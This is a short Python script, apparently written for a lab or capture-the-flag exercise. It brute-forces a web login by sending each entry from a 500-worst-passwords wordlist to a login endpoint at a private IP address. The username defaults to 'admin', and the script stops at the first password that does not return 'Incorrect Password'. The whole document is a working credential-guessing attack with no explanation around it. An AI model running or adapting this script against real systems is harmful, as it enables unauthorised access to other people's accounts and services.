'''
The purpose of this code is to rapidly run common passwords 
for the admin account, and will output any value that doesn't produce the
response "Incorrect Password"
'''

import requests

# checks admin password against top 500 bad passwords:
# https://github.com/danielmiessler/SecLists/blob/master/Passwords/500-worst-passwords.txt
# normally, I would use more, but scared of server load

pass_file = open("../500-worst-passwords.txt")
user = input("Username to crack: ")
if user == "":
    user = "admin"

for line in pass_file:
    pw = line.rstrip()
    r = requests.post("http://10.66.28.202:8230/login", data={
        "username": user,
        "password": pw
    })
    if r.text != "Incorrect Password":
        print(pw)
        break

